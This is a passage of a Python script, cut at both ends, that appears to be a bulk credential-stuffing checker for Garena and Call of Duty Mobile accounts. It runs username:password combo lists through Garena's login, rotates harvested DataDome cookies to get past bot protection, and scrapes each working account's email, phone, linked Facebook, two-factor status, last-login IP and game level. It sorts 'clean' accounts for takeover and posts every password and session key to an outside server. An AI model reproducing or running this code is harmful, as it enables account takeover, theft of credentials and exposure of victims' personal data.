    if cookie_value and cookie_value not in DATADOME_VALUES:
        DATADOME_VALUES.append(cookie_value)
        try:
            with open(DATADOME_FILE, 'w', encoding='utf-8') as f:
                json.dump(DATADOME_VALUES, f, indent=4)
        except Exception as e:
            pass
    else:
        pass

def save_fresh_datadome_cookie(cookie_value):
    if not cookie_value:
        return
    existing_fresh_datadomes = set()
    if os.path.exists(FRESH_DATADOMES_FILE):
        try:
            with open(FRESH_DATADOMES_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    existing_fresh_datadomes.add(line.strip())
        except Exception as e:
            pass
    if cookie_value not in existing_fresh_datadomes:
        try:
            with open(FRESH_DATADOMES_FILE, 'a', encoding='utf-8') as f:
                f.write(cookie_value + '\n')
        except Exception as e:
            pass
    else:
        pass

def handle_datadome_protection(session, common_headers, datadome_client_key, datadome_cookie=None):
    datadome_headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://sso.garena.com',
        'referer': 'https://sso.garena.com/',
        'sec-ch-ua': common_headers['sec-ch-ua'],
        'sec-ch-ua-mobile': common_headers['sec-ch-ua-mobile'],
        'sec-ch-ua-platform': common_headers['sec-ch-ua-platform'],
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': common_headers['user-agent'],
        'x-requested-with': 'XMLHttpRequest'
    }
    if datadome_cookie:
        session.cookies.set('datadome', datadome_cookie, domain='.garena.com', path='/')
    else:
        pass
    datadome_response = session.post(
        'https://dd.garena.com/js/',
        headers=datadome_headers,
        timeout=10
    )
    datadome_response = session.post(
        'https://dd.garena.com/js/',
        headers=datadome_headers,
        timeout=10
    )
    current_datadome = session.cookies.get('datadome')
    if current_datadome and current_datadome != datadome_cookie:
        save_datadome_cookie(current_datadome)
        save_fresh_datadome_cookie(current_datadome)

def get_codm_delete_token(session, access_token, common_headers):
    callback_n_url = "https://auth.codm.garena.com/auth/auth/callback_n"
    callback_n_params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }
    callback_n_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "sec-ch-ua": common_headers['sec-ch-ua'],
        "sec-ch-ua-mobile": common_headers['sec-ch-ua-mobile'],
        "sec-ch-ua-platform": common_headers['sec-ch-ua-platform'],
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": common_headers['user-agent']
    }
    try:
        response = session.get(callback_n_url, headers=callback_n_headers, params=callback_n_params, allow_redirects=True, timeout=10)
        if response.status_code == 200:
            parsed_url = urlparse(response.url)
            query_params = parse_qs(parsed_url.query)
            extracted_token = query_params.get("token", [None])[0]
            if extracted_token:
                return extracted_token
            else:
                return None
        else:
            return None
    except requests.exceptions.RequestException as e:
        return None

def check_account(username, password, current_datadome_cookie=None):
    try:
        randomNum = str(random.randint(1000000000000, 9999999999999))
        common_headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        session = requests.Session()
        universal_url = "https://sso.garena.com/api/universal/login"
        universal_params = {
            "app_id": "10100",
            "redirect_uri": "https://account.garena.com/",
            "locale": "en-PH",
            "format": "json",
            "id": randomNum
        }
        universal_headers = common_headers.copy()
        universal_headers.update({
            'host': 'sso.garena.com',
            'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH'
        })
        response = session.get(universal_url, params=universal_params, headers=universal_headers, timeout=10)
        try:
            universal_data = response.json()
        except json.JSONDecodeError as e:
            return {
                "status": "error",
                "type": "JSON Parsing Error",
                "message": f"Failed to parse universal login response: {e}",
                "username": username,
                "password": password
            }
        datadome_client_key = universal_data.get('datadome_client_key')
        if not datadome_client_key:
            pass
        handle_datadome_protection(session, common_headers, datadome_client_key, datadome_cookie=current_datadome_cookie)
        prelogin_auth_url = "https://auth.garena.com/api/prelogin"
        prelogin_auth_headers = common_headers.copy()
        prelogin_auth_headers.update({
            'host': 'auth.garena.com',
            'referer': 'https://auth.garena.com/universal/oauth?client_id=100082&response_type=token',
            'x-requested-with': 'XMLHttpRequest'
        })
        prelogin_auth_params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": randomNum
        }
        response = session.get(prelogin_auth_url, params=prelogin_auth_params, headers=prelogin_auth_headers, timeout=10)
        try:
            prelogin_data = response.json()
        except json.JSONDecodeError as e:
            return {
                "status": "error",
                "type": "JSON Parsing Error",
                "message": f"Failed to parse prelogin response: {e}",
                "username": username,
                "password": password
            }
        if "url" in prelogin_data:
            return {
                "status": "captcha",
                "type": "CAPTCHA Required",
                "message": "CAPTCHA triggered. Please change IP and press Enter to continue.",
                "username": username,
                "password": password
            }
        v1 = prelogin_data.get('v1', '')
        v2 = prelogin_data.get('v2', '')
        prelogin_id = prelogin_data.get('id', '')
        if not all([v1, v2, prelogin_id]):
            return {
                "status": "failed",
                "type": "Prelogin Error",
                "message": "Account Doesn't Exist or Prelogin Failed",
                "username": username,
                "password": password
            }
        login_auth_url = "https://auth.garena.com/api/login"
        encrypted_password = encode_password(password, v1, v2)
        login_auth_headers = common_headers.copy()
        login_auth_headers.update({
            'host': 'auth.garena.com',
            'referer': 'https://auth.garena.com/universal/oauth?client_id=100082&response_type=token',
            'x-requested-with': 'XMLHttpRequest'
        })
        login_auth_params = {
            'app_id': '100082',
            'account': username,
            'password': encrypted_password,
            'redirect_uri': 'https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
            'format': 'json',
            'id': prelogin_id
        }
        response = session.get(login_auth_url, params=login_auth_params, headers=login_auth_headers, timeout=10)
        try:
            login_data = response.json()
        except json.JSONDecodeError as e:
            return {
                "status": "error",
                "type": "JSON Parsing Error",
                "message": f"Failed to parse login response: {e}",
                "username": username,
                "password": password
            }
        if "error" in login_data or not login_data.get('success', True):
            error_msg = login_data.get('error', 'Unknown error')
            return {
                "status": "failed",
                "type": "Authentication Error",
                "message": error_msg,
                "username": username,
                "password": password
            }
        session_key = login_data.get('session_key')
        if not session_key:
            return {
                "status": "failed",
                "type": "Session Error",
                "message": "No session key received after login",
                "username": username,
                "password": password
            }
        grant_url = "https://auth.garena.com/oauth/token/grant"
        grant_headers = common_headers.copy()
        grant_headers.update({
            'host': 'auth.garena.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://auth.garena.com',
            'referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100081&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
            'sec-ch-ua-mobile': '?1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        })
        grant_data = {
            "client_id": "100082",
            "response_type": "token",
            "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
            "format": "json",
            "id": prelogin_id
        }
        grant_response = session.post(grant_url, headers=grant_headers, data=urlencode(grant_data), timeout=10)
        try:
            grant_json = grant_response.json()
        except json.JSONDecodeError as e:
            return {
                "status": "error",
                "type": "JSON Parsing Error",
                "message": f"Failed to parse grant token response: {e}",
                "username": username,
                "password": password
            }
        access_token = grant_json.get('access_token')
        if not access_token:
            return {
                "status": "failed",
                "type": "Token Grant Error",
                "message": "Failed to obtain access token after login",
                "username": username,
                "password": password
            }
        account_headers = common_headers.copy()
        account_headers.update({
            'accept': '*/*',
            'host': 'account.garena.com',
            'referer': 'https://account.garena.com/',
            'x-requested-with': 'XMLHttpRequest'
        })
        account_info_response = session.get("https://account.garena.com/api/account/init", headers=account_headers, timeout=10)
        account_info_json_str = account_info_response.text if account_info_response.status_code == 200 else "{}"
        codm_delete_token = get_codm_delete_token(session, access_token, common_headers)
        codm_info_json_str = "{}"
        if codm_delete_token:
            connected_games_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
            connected_games_headers = {
                'Accept': 'application/json, text/plain, */*',
                'codm-delete-token': codm_delete_token,
                'Origin': 'https://delete-request.codm.garena.co.id',
                'Referer': 'https://delete-request.codm.garena.co.id/',
                'User-Agent': common_headers['user-agent']
            }
            connected_games_response = session.get(connected_games_url, headers=connected_games_headers, timeout=10)
            if connected_games_response.status_code == 200:
                codm_info_json_str = connected_games_response.text
            else:
                pass
        else:
            pass
        parser_payload = {
            'username': username,
            'password': password,
            'uid': login_data.get('uid', ''),
            'session_key': session_key,
            'account_info_json': account_info_json_str,
            'codm_info_json': codm_info_json_str
        }
        try:
            # Add the API Key to the headers for the call to init.php
            taji_headers = {
                'Content-Type': 'application/json',
                'X-API-Key': TAJI_API_KEY # Add your API Key here
            }
            taji_response = requests.post(OWN_SITE_KO_TO_GAGO, json=parser_payload, headers=taji_headers, timeout=15)
            taji_result = taji_response.json()
            if taji_result.get('status') == 'success':
                parsed_data = taji_result['data']
                parsed_data['status'] = 'success'
                return parsed_data
            else:
                return {
                    "status": "error",
                    "type": "PHP Parsing Error",
                    "message": taji_result.get('message', 'Unknown error from PHP parser'),
                    "username": username,
                    "password": password
                }
        except json.JSONDecodeError as e:
            return {
                "status": "error",
                "type": "JSON Parsing Error",
                "message": f"Failed to parse PHP response: {e}",
                "username": username,
                "password": password
            }
        except requests.exceptions.RequestException as e:
            return {
                "status": "error",
                "type": "Network Error (PHP Parser)",
                "message": f"Could not connect to PHP parser: {e}",
                "username": username,
                "password": password
            }
    except Exception as e:
        return {
            "status": "error",
            "type": "Exception",
            "message": str(e),
            "username": username,
            "password": password
        }

def format_account_output(result):
    output_str = ""
    if result["status"] == "success":
        codm_info = result.get("codm_info", {})
        if all(codm_info.get(key, "N/A") == "N/A" for key in ["uid", "region", "nickname", "level"]):
            output_str += f"❌ Account Check Failed\n"
            output_str += f"    Login: {result['username']}:{result['password']}\n"
            output_str += f"    -> NO CODM ACCOUNT!\n"
        else:
            output_str += f"✅ Account Check Success\n"
            output_str += f"    -> Login: {result['username']}:{result['password']}\n"
            output_str += f"    -> Garena Shell: {result['shell']}\n"
            
            # Email formatting
            email_status = "Verified" if result['email_verified'] == 'Yes' else "Not Verified"
            email_display = f"{result['email']} ({email_status})" if result['email'] not in ['N/A', ''] else "N/A"
            output_str += f"    -> Email: {email_display}\n"

            # Mobile formatting
            mobile_display = "N/A"
            if result['mobile'] not in ['Not Set', 'N/A', '']:
                country_code = CODM_REGIONS.get(result['country'], {}).get('code', '')
                if country_code:
                    mobile_display = f"+{country_code} {result['mobile']}"
                else:
                    mobile_display = result['mobile']
            output_str += f"    -> Mobile: {mobile_display}\n"

            facebook_data = result.get('facebook', 'Not Connected')
            fb_username = "N/A"
            fb_uid = "N/A"
            fb_link = "N/A"
            fb_info = "NOT CONNECTED"
            if isinstance(facebook_data, dict):
                fb_username = facebook_data.get('fb_username', '')
                fb_uid = facebook_data.get('fb_uid', 'N/A')
                fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}" if fb_uid != 'N/A' else "N/A"
                if fb_username:
                    fb_info = "CONNECTED"
                else:
                    fb_info = "FB UNBIND or FB DELETED"
                    fb_username = "N/A"
            output_str += f"    -> Facebook Username: {fb_username}\n"
            output_str += f"    -> Facebook Link: {fb_link}\n"
            output_str += f"    -> Facebook Info: {fb_info}\n"
            output_str += f"    -> Security:\n"
            output_str += f"        Email Verified: {result['email_verified']}\n"
            output_str += f"        Two-Step Verify: {result['two_step_verify']}\n"
            output_str += f"        Authenticator: {result['authenticator']}\n"
            output_str += f"    -> Last Login:\n"
            output_str += f"        IP: {result['last_login_ip']}\n"
            output_str += f"        Country: {result['last_login_country']}\n"
            output_str += f"        Source: {result['last_login_source']}\n"
            output_str += f"    -> CODM Info:\n"
            codm_region_code = codm_info.get('region', 'N/A')
            formatted_region = codm_region_code
            if codm_region_code != 'N/A' and codm_region_code in CODM_REGIONS:
                region_data = CODM_REGIONS[codm_region_code]
                formatted_region = f"{region_data['flag']} {region_data['name']} ({codm_region_code})"
            output_str += f"        Account Level: {codm_info.get('level', 'N/A')}\n"
            output_str += f"        Server: {formatted_region}\n"
            output_str += f"        IGN: {codm_info.get('nickname', 'N/A')}\n"
            output_str += f"        UID: {codm_info.get('uid', 'N/A')}\n"
            
            output_str += f"    -> Account Status: {result['account_status']}\n"
            output_str += f"\n-> Powered by: @LEGITDax\n"
    elif result["status"] == "failed":
        output_str += f"❌ Account Check Failed\n"
        output_str += f"    Login: {result['username']}:{result['password']}\n"
        if result['type'] in ["Authentication Error", "Token Grant Error"]:
            output_str += f"    -> INCORRECT PASSWORD!\n"
        elif result['type'] == "Prelogin Error":
            output_str += f"    -> ACCOUNT DOESN'T EXIST!\n"
        else:
            output_str += f"    Message: {result['message']}\n"
    elif result["status"] == "captcha":
        output_str += f"⚠️ CAPTCHA Triggered\n"
        output_str += f"    Login: {result['username']}:{result['password']}\n"
        output_str += f"    Message: {result['message']}\n"
    elif result["status"] == "error":
        output_str += f"❗ An Error Occurred\n"
        output_str += f"    Login: {result['username']}:{result['password']}\n"
        output_str += f"    Error Details:\n"
        output_str += f"    Type: {result['type']}\n"
        output_str += f"    Message: {result['message']}\n"
    output_str += f"\n{'-'*80}\n"
    return output_str

def print_account_result_to_console(result):
    output_str = ""
    if result["status"] == "success":
        codm_info = result.get("codm_info", {})
        if all(codm_info.get(key, "N/A") == "N/A" for key in ["uid", "region", "nickname", "level"]):
            output_str += f"{Fore.RED}❌ Account Check Failed{Style.RESET_ALL}\n"
            output_str += f"    {Fore.RED}Login: {result['username']}:{result['password']}{Style.RESET_ALL}\n"
            output_str += f"    {Fore.RED}-> NO CODM ACCOUNT!{Style.RESET_ALL}\n"
        else:
            main_color = Fore.GREEN if result["account_status"] == "Clean" else Fore.YELLOW
            status_color = Fore.GREEN if result["account_status"] == "Clean" else Fore.RED
            output_str += f"{main_color}✅ Account Check Success{Style.RESET_ALL}\n"
            output_str += f"    {main_color}-> Login: {result['username']}:{result['password']}{Style.RESET_ALL}\n"
            shell_value = result.get('shell', 0)
            shell_color = Fore.RED if shell_value == 0 else main_color
            output_str += f"    {main_color}-> Garena Shell: {shell_color}{shell_value}{Style.RESET_ALL}\n"
            
            # Email formatting with color
            email_status_text = "Verified" if result['email_verified'] == 'Yes' else "Not Verified"
            email_status_color = Fore.GREEN if result['email_verified'] == 'Yes' else Fore.RED
            email_display = ""
            if result['email'] not in ['N/A', '']:
                email_display = f"{result['email']} ({email_status_color}{email_status_text}{Style.RESET_ALL})"
            else:
                email_display = f"{Fore.RED}N/A{Style.RESET_ALL}"
            output_str += f"    {main_color}-> Email: {email_display}{Style.RESET_ALL}\n"

            # Mobile formatting with color
            mobile_display = ""
            if result['mobile'] not in ['Not Set', 'N/A', '']:
                country_code = CODM_REGIONS.get(result['country'], {}).get('code', '')
                if country_code:
                    mobile_display = f"{main_color}+{country_code} {result['mobile']}{Style.RESET_ALL}"
                else:
                    mobile_display = f"{main_color}{result['mobile']}{Style.RESET_ALL}"
            else:
                mobile_display = f"{Fore.RED}N/A{Style.RESET_ALL}"
            output_str += f"    {main_color}-> Mobile: {mobile_display}{Style.RESET_ALL}\n"

            facebook_data = result.get('facebook', 'Not Connected')
            fb_username = "N/A"
            fb_uid = "N/A"
            fb_link = "N/A"
            fb_info = "NOT CONNECTED"
            fb_info_color = Fore.RED
            if isinstance(facebook_data, dict):
                fb_username = facebook_data.get('fb_username', '')
                fb_uid = facebook_data.get('fb_uid', 'N/A')
                fb_link = f"https://www.facebook.com/profile.php?id={fb_uid}" if fb_uid != 'N/A' else "N/A"
                if fb_username:
                    fb_info = "CONNECTED"
                    fb_info_color = Fore.GREEN
                else:
                    fb_info = "FB UNBIND or FB DELETED"
                    fb_info_color = Fore.YELLOW
                    fb_username = "N/A"
            output_str += f"    {main_color}-> Facebook Username: {fb_username}{Style.RESET_ALL}\n"
            output_str += f"    {main_color}-> Facebook Link: {fb_link}{Style.RESET_ALL}\n"
            output_str += f"    {main_color}-> Facebook Info: {fb_info_color}{fb_info}{Style.RESET_ALL}\n"
            output_str += f"    {main_color}-> Security:{Style.RESET_ALL}\n"
            output_str += f"        {main_color} Email Verified: {result['email_verified']}{Style.RESET_ALL}\n"
            output_str += f"        {main_color} Two-Step Verify: {result['two_step_verify']}{Style.RESET_ALL}\n"
            output_str += f"        {main_color} Authenticator: {result['authenticator']}{Style.RESET_ALL}\n"
            output_str += f"    {main_color}-> Last Login:{Style.RESET_ALL}\n"
            output_str += f"        {main_color} IP: {result['last_login_ip']}{Style.RESET_ALL}\n"
            output_str += f"        {main_color} Country: {result['last_login_country']}{Style.RESET_ALL}\n"
            output_str += f"        {main_color} Source: {result['last_login_source']}{Style.RESET_ALL}\n"
            output_str += f"{main_color}    -> CODM Info:{Style.RESET_ALL}\n"
            codm_region_code = codm_info.get('region', 'N/A')
            formatted_region = codm_region_code
            if codm_region_code != 'N/A' and codm_region_code in CODM_REGIONS:
                region_data = CODM_REGIONS[codm_region_code]
                formatted_region = f"{region_data['flag']} {region_data['name']} ({codm_region_code})"
            output_str += f"        {main_color} Account Level:{Style.RESET_ALL} {codm_info.get('level', 'N/A')}{Style.RESET_ALL}\n"
            output_str += f"        {main_color} Server:{Style.RESET_ALL} {formatted_region}{Style.RESET_ALL}\n"
            output_str += f"        {main_color} IGN: {codm_info.get('nickname', 'N/A')}{Style.RESET_ALL}\n"
            output_str += f"        {main_color} UID: {codm_info.get('uid', 'N/A')}{Style.RESET_ALL}\n"
            output_str += f"    -> Account Status: {status_color}{result['account_status']}{Style.RESET_ALL}\n"
            output_str += f"\n{Style.BRIGHT} {main_color}-> Powered by: @LEGITDax{Style.RESET_ALL}\n"
    elif result["status"] == "failed":
        output_str += f"{Fore.RED}❌ Account Check Failed{Style.RESET_ALL}\n"
        output_str += f"    {Fore.RED}Login: {result['username']}:{result['password']}{Style.RESET_ALL}\n"
        if result['type'] in ["Authentication Error", "Token Grant Error"]:
            output_str += f"    {Fore.RED}-> INCORRECT PASSWORD!{Style.RESET_ALL}\n"
        elif result['type'] == "Prelogin Error":
            output_str += f"    {Fore.RED}-> ACCOUNT DOESN'T EXIST!{Style.RESET_ALL}\n"
        else:
            output_str += f"    {Fore.RED}Message: {result['message']}{Style.RESET_ALL}\n"
    elif result["status"] == "captcha":
        output_str += f"{Fore.MAGENTA}⚠️ CAPTCHA Triggered{Style.RESET_ALL}\n"
        output_str += f"    {Fore.MAGENTA}Login: {result['username']}:{result['password']}{Style.RESET_ALL}\n"
        output_str += f"    {Fore.MAGENTA}Message: {result['message']}{Style.RESET_ALL}\n"
    elif result["status"] == "error":
        output_str += f"{Fore.RED}❗ An Error Occurred\n"
        output_str += f"    {Fore.RED}Login: {result['username']}:{result['password']}{Style.RESET_ALL}\n"
        output_str += f"    {Fore.RED}Error Details:{Style.RESET_ALL}\n"
        output_str += f"    {Fore.RED}Type: {result['type']}{Style.RESET_ALL}\n"
        output_str += f"    {Fore.RED}Message: {result['message']}{Style.RESET_ALL}\n"
    output_str += f"\n{'-'*80}\n"
    print(output_str, end='')

def remove_color_codes(s):
    s = s.replace(Fore.BLACK, '')
    s = s.replace(Fore.RED, '')
    s = s.replace(Fore.GREEN, '')
    s = s.replace(Fore.YELLOW, '')
    s = s.replace(Fore.BLUE, '')
    s = s.replace(Fore.MAGENTA, '')
    s = s.replace(Fore.CYAN, '')
    s = s.replace(Fore.WHITE, '')
    s = s.replace(Fore.RESET, '')
    s = s.replace(Style.BRIGHT, '')
    s = s.replace(Style.DIM, '')
    s = s.replace(Style.NORMAL, '')
    s = s.replace(Style.RESET_ALL, '')
    return s

def get_codm_level_for_sort(account_data):
    try:
        codm_info = account_data.get("codm_info", {})
        level_str = codm_info.get("level", "0")
        return int(level_str)
    except (ValueError, TypeError):
        return 0

def bulk_check(input_file, base_output_folder="output", auto_remove_lines=False, num_lines_to_check=None):
    successful_count = 0
    failed_count = 0
    error_count = 0
    captcha_count = 0
    no_codm_count = 0
    clean_count = 0
    not_clean_count = 0
    highest_clean_codm_level = 0
    successful_accounts_data = []
    clean_accounts_data = []
    not_clean_accounts_data = []
    no_codm_accounts_data = []
    failed_accounts_data = []
    error_accounts_data = []
    os.makedirs(base_output_folder, exist_ok=True)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_folder = os.path.join(base_output_folder, f"output_{timestamp}")
    os.makedirs(output_folder, exist_ok=True)
    success_file_path = os.path.join(output_folder, f"success_{timestamp}.txt")
    failed_file_path = os.path.join(output_folder, f"failed_{timestamp}.txt")
    error_file_path = os.path.join(output_folder, f"error_{timestamp}.txt")
    clean_file_path = os.path.join(output_folder, f"clean_{timestamp}.txt")
    not_clean_file_path = os.path.join(output_folder, f"not_clean_{timestamp}.txt")
    no_codm_file_path = os.path.join(output_folder, f"no_codm_{timestamp}.txt")
    live_output_file_path = os.path.join(output_folder, f"live_output_{timestamp}.txt")
    load_datadome_cookies()
    datadome_queue = deque(DATADOME_VALUES)
    console.print(f"[green]-> Found {len(DATADOME_VALUES)} DataDome cookies in {DATADOME_FILE}.[/green]") # Added line
    current_datadome_cookie = None
    if datadome_queue:
        current_datadome_cookie = datadome_queue[0]
        console.print(f"[green]-> Using initial DataDome cookie from file: {current_datadome_cookie[:20]}...[/green]")
    else:
        console.print(f"[yellow]-> No DataDome cookies found in {DATADOME_FILE}. You may need to provide one manually.[/yellow]")
    initial_datadome_input = console.input(f"[cyan]-> Enter initial DataDome cookie value (leave blank to use existing/none): [/cyan]").strip()
    if initial_datadome_input:
        current_datadome_cookie = initial_datadome_input
        if current_datadome_cookie not in datadome_queue:
            datadome_queue.append(current_datadome_cookie)
        console.print(f"[green]-> Using manually provided DataDome cookie: {current_datadome_cookie[:20]}...[/green]")
    elif current_datadome_cookie:
        console.print(f"[green]-> Using DataDome cookie: {current_datadome_cookie[:20]}...[/green]")
    try:
        with open(input_file, 'r', encoding='utf-8') as infile:
            accounts = [line.strip() for line in infile.readlines() if line.strip()]

        if num_lines_to_check is not None:
            accounts = accounts[:num_lines_to_check]

        total_accounts = len(accounts)
        accounts_to_process = deque(accounts)
        remaining_accounts_for_rewrite = []
        while accounts_to_process:
            acc = accounts_to_process.popleft()
            if ':' in acc:
                username, password = acc.split(':', 1)
                cookie_used_for_this_attempt = current_datadome_cookie
                result = check_account(username, password, current_datadome_cookie)
                if result["status"] == "success":
                    if cookie_used_for_this_attempt and cookie_used_for_this_attempt == current_datadome_cookie:
                        save_datadome_cookie(cookie_used_for_this_attempt)
                    codm_info = result.get("codm_info", {})
                    if all(codm_info.get(key, "N/A") == "N/A" for key in ["uid", "region", "nickname", "level"]):
                        no_codm_count += 1
                        no_codm_accounts_data.append(result)
                        print_account_result_to_console(result)
                    else:
                        successful_count += 1
                        successful_accounts_data.append(result)
                        is_clean = (result["account_status"] == "Clean")
                        if is_clean:
                            clean_count += 1
                            clean_accounts_data.append(result)
                            try:
                                codm_level = int(result.get("codm_info", {}).get('level', 0))
                                if codm_level > highest_clean_codm_level:
                                    highest_clean_codm_level = codm_level
                            except ValueError:
                                pass
                        else:
                            not_clean_count += 1
                            not_clean_accounts_data.append(result)
                        print_account_result_to_console(result)
                elif result["status"] == "failed":
                    failed_count += 1
                    failed_accounts_data.append(result)
                    print_account_result_to_console(result)
                elif result["status"] == "captcha":
                    captcha_count += 1
                    print_account_result_to_console(result)
                    console.print(f"[yellow]CAPTCHA triggered for {username}. Please change your IP address and/or provide a new DataDome cookie.[/yellow]")
                    action_choice = console.input(f"[yellow]Press 'n' to try next DataDome from file, paste a new one, or press Enter to retry with current IP/cookie: [/yellow]").strip().lower()
                    if action_choice == 'n':
                        if len(datadome_queue) > 1:
                            datadome_queue.rotate(-1)
                            current_datadome_cookie = datadome_queue[0]
                            console.print(f"[green]Trying next DataDome cookie from file: {current_datadome_cookie[:20]}...[/green]")
                        elif len(datadome_queue) == 1:
                            console.print(f"[yellow]Only one DataDome cookie in file. Retrying with current IP and cookie.[/yellow]")
                        else:
                            console.print(f"[yellow]No DataDome cookies in file. Retrying with current IP and cookie.[/yellow]")
                    elif action_choice:
                        current_datadome_cookie = action_choice
                        if current_datadome_cookie not in datadome_queue:
                            datadome_queue.append(current_datadome_cookie)
                        console.print(f"[green]Using new DataDome cookie: {current_datadome_cookie[:20]}...[/green]")
                    else:
                        console.print(f"[yellow]Retrying with current IP and DataDome cookie.[/yellow]")
                    accounts_to_process.appendleft(acc)
                    console.print(f"[cyan]Pausing for 5 seconds before retrying...[/cyan]")
                    time.sleep(5)
                elif result["status"] == "error":
                    error_count += 1
                    error_accounts_data.append(result)
                    print_account_result_to_console(result)
            else:
                error_msg = f"⚠️ Invalid format: {acc}"
                error_accounts_data.append({"status": "error", "type": "Invalid Format", "message": error_msg, "username": acc, "password": ""})
                print_account_result_to_console({"status": "error", "type": "Invalid Format", "message": error_msg, "username": acc, "password": ""})
                error_count += 1
                remaining_accounts_for_rewrite.append(acc)
            processed_count = successful_count + failed_count + error_count + captcha_count + no_codm_count
            sys.stdout.write(f"\r{Fore.MAGENTA}Checking: {processed_count}/{total_accounts}{Style.RESET_ALL} {Fore.CYAN}|{Style.RESET_ALL} {Fore.GREEN}VALID: {successful_count}{Style.RESET_ALL} {Fore.CYAN}|{Style.RESET_ALL} {Fore.RED}INVALID: {failed_count}{Style.RESET_ALL} {Fore.CYAN}|{Style.RESET_ALL} {Fore.GREEN}CLEAN: {clean_count}{Style.RESET_ALL} {Fore.CYAN}|{Style.RESET_ALL} {Fore.YELLOW}NOTCLEAN: {not_clean_count}{Style.RESET_ALL} {Fore.CYAN}|{Style.RESET_ALL} {Fore.GREEN}HIGHEST CLEAN LEVEL: {highest_clean_codm_level}{Style.RESET_ALL}\n")
            sys.stdout.flush()
            with open(success_file_path, 'w', encoding='utf-8') as f:
                sorted_data = sorted(successful_accounts_data, key=get_codm_level_for_sort, reverse=True)
                for res in sorted_data:
                    f.write(format_account_output(res))
            with open(clean_file_path, 'w', encoding='utf-8') as f:
                sorted_data = sorted(clean_accounts_data, key=get_codm_level_for_sort, reverse=True)
                for res in sorted_data:
                    f.write(format_account_output(res))
            with open(not_clean_file_path, 'w', encoding='utf-8') as f:
                sorted_data = sorted(not_clean_accounts_data, key=get_codm_level_for_sort, reverse=True)
                for res in sorted_data:
                    f.write(format_account_output(res))
            with open(failed_file_path, 'w', encoding='utf-8') as f:
                for res in failed_accounts_data:
                    f.write(format_account_output(res))
            with open(error_file_path, 'w', encoding='utf-8') as f:
                for res in error_accounts_data:
                    f.write(format_account_output(res))
            with open(no_codm_file_path, 'w', encoding='utf-8') as f:
                for res in no_codm_accounts_data:
                    f.write(f"❌ NO CODM ACCOUNT!\n")
                    f.write(f"Login: {res['username']}:{res['password']}\n")
                    f.write(f"{'-'*40}\n")
            with open(live_output_file_path, 'w', encoding='utf-8') as live_outfile:
                all_current_results = []
                all_current_results.extend(successful_accounts_data)
                all_current_results.extend(failed_accounts_data)
                all_current_results.extend(error_accounts_data)
                all_current_results.extend(no_codm_accounts_data)
                all_current_results.sort(key=get_codm_level_for_sort, reverse=True)
                for res in all_current_results:
                    live_outfile.write(format_account_output(res))
            time.sleep(1)
        print()
        summary_table = Table()
        summary_table.add_column("Summary", style="bold", justify="left")
        summary_table.add_column("Count", style="bold green", justify="right")
        summary_table.add_column("Percentage", style="bold yellow", justify="right")
        total_processed = successful_count + failed_count + error_count + captcha_count + no_codm_count
        if total_processed == 0:
            total_processed = 1
        summary_table.add_row("Total Accounts Checked", str(total_accounts), "100.00%")
        summary_table.add_row("Successful Logins (with CODM)", str(successful_count), f"{successful_count/total_processed*100:.2f}%", style="green")
        summary_table.add_row("Failed Logins (Incorrect Pass/No Account)", str(failed_count), f"{failed_count/total_processed*100:.2f}%", style="red")
        summary_table.add_row("CAPTCHA Triggered", str(captcha_count), f"{captcha_count/total_processed*100:.2f}%", style="yellow")
        summary_table.add_row("Errors (Parsing/Network)", str(error_count), f"{error_count/total_processed*100:.2f}%", style="red")
        summary_table.add_row("No CODM Account", str(no_codm_count), f"{no_codm_count/total_processed*100:.2f}%", style="blue")
        console.print(summary_table)
        codm_status_table = Table()
        codm_status_table.add_column("Result", style="bold", justify="left")
        codm_status_table.add_column("Count", style="bold green", justify="right")
        codm_status_table.add_column("Percentage", style="bold yellow", justify="right")
        total_codm_accounts = successful_count
        if total_codm_accounts == 0:
            total_codm_accounts = 1
        codm_status_table.add_row("Clean Accounts", str(clean_count), f"{clean_count/total_codm_accounts*100:.2f}%", style="green")
